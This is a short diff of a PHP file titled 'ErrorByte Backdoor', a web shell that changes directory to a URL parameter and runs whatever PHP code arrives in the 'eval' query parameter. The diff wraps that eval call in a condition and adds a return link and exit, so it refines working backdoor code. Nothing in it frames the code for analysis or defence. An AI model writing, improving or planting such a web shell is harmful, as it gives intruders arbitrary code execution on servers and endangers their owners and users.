@@ -101,7 +101,11 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 $dir = $_GET['d'];
 chdir($dir);
 $direktori = getcwd();
+if(isset($_GET['eval'])) {
 $cok = str_replace("'", '"', $_GET['eval']); echo eval($cok);
+echo "<br><br><a href='?'>Back Home</a>";
+exit;
+}
 ?>
 <title>ErrorByte Backdoor</title>
 <link rel="shortcut icon" type="image/x-icon" href="https://img.deusm.com/darkreading/bh-asia-facebook-profile.png">
